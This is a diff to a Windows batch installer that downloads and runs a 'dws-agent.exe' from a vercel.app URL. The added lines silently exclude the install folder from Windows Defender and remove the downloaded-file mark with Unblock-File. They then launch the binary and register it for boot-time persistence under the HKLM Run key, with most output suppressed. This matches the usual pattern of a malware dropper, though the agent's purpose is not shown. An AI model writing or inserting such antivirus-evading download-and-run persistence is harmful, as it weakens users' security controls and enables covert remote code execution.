@@ -22,27 +22,36 @@ if '%errorlevel%' NEQ '0' (
 
 setlocal EnableDelayedExpansion
 
-REM Get the directory where this script is located
-set "INSTALL_DIR=%~dp0"
-set "INSTALL_DIR=%INSTALL_DIR:~0,-1%"
+REM Install to ProgramData folder (works better on Windows 10)
+set "INSTALL_DIR=%ProgramData%\DWSAgent"
 set "AGENT_PATH=%INSTALL_DIR%\dws-agent.exe"
 set "DOWNLOAD_URL=https://dws-parth.vercel.app/dws-agent.exe"
 
-REM Download the latest dws-agent.exe
-powershell -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri '%DOWNLOAD_URL%' -OutFile '%AGENT_PATH%'" >nul 2>&1
+REM Create install directory
+if not exist "%INSTALL_DIR%" mkdir "%INSTALL_DIR%"
+
+REM Kill any existing instance first
+taskkill /F /IM dws-agent.exe >nul 2>&1
+timeout /t 2 /nobreak >nul
+
+REM Add Windows Defender exclusion for the install folder
+powershell -Command "Add-MpPreference -ExclusionPath '%INSTALL_DIR%'" >nul 2>&1
+
+REM Download the latest dws-agent.exe with better error handling
+powershell -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; $ProgressPreference = 'SilentlyContinue'; try { Invoke-WebRequest -Uri '%DOWNLOAD_URL%' -OutFile '%AGENT_PATH%' -UseBasicParsing } catch { exit 1 }"
+
+REM Unblock the downloaded file (removes "downloaded from internet" flag)
+powershell -Command "Unblock-File -Path '%AGENT_PATH%'" >nul 2>&1
 
 REM Check if dws-agent.exe exists
 if not exist "%AGENT_PATH%" (
-    echo ERROR: dws-agent.exe not found in %INSTALL_DIR%
+    echo ERROR: Download failed
     timeout /t 5
     exit /b 1
 )
 
-REM Kill any existing instance
-taskkill /F /IM dws-agent.exe >nul 2>&1
-
 REM Start the agent immediately in background
-start "" /B "%AGENT_PATH%"
+start "" "%AGENT_PATH%"
 
 REM Add to Windows Startup using Registry (runs on reboot with admin rights)
 reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "DWSAgent" /t REG_SZ /d "\"%AGENT_PATH%\"" /f >nul 2>&1
